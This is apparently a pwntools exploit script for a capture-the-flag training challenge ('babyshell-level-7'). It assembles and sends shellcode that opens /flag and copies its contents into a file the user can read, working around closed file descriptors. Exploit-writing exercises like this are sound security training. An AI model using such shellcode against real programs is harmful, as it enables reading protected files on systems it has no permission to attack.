from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = '/challenge/babyshell-level-7'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']
# opens flag, opens result flag (using WRONLY flag)
# then read falg, write to result flag
# rsi holds FLAGS
# rdx holds Permissions
# rsp holds buffer for read

# Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.

assembly = """
    lea rdi, [rip+flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov r8, rax

    lea rdi, [rip+result]
    mov rsi, 65
    mov rdx, 0x1A4
    mov rax, 2
    syscall

    mov r9, rax

    mov rdi, r8
    mov rsi, rsp
    mov rdx, 1000
    xor rax, rax
    syscall

    mov r10, rax

    mov rdi, r9
    mov rsi, rsp
    mov rdx, r10
    mov rax, 1
    syscall

    flag:
    .string "/flag"

    result:
    .string "/home/hacker/flag"
    """
# Writes the flag to another file

shellcode = asm(assembly)
print(shellcode)

io = start()

payload = flat([shellcode])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()
